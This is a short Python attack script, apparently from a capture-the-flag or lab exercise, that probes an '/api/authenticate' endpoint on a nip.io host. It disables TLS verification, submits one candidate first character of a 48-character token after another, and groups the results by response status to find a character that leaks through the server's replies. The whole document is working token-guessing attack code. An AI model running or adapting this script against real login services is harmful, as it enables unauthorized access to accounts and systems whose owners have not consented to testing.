import requests
import string
import time
import urllib3

urllib3.disable_warnings()

BASE_URL = "https://bbfbc1bf-5042-411e-86b4-29657887ee45.222.255.138.122.nip.io"
s = requests.Session()
s.verify = False

charset = string.ascii_letters + string.digits

results = {}
for c in charset:
    time.sleep(0.3)
    token = c + "0" * 47
    try:
        r = s.post(f"{BASE_URL}/api/authenticate", json={"token": token}, timeout=10)
        print(f"char: {c} -> status: {r.status_code}, body: {r.text[:80]}")
        results[c] = (r.status_code, r.text)
    except Exception as e:
        print(f"char: {c} -> error: {e}")
        results[c] = ("error", str(e))

print("\n--- Summary ---")
for status in set(res[0] for res in results.values()):
    chars = [c for c, res in results.items() if res[0] == status]
    print(f"Status {status}: {''.join(chars)}")
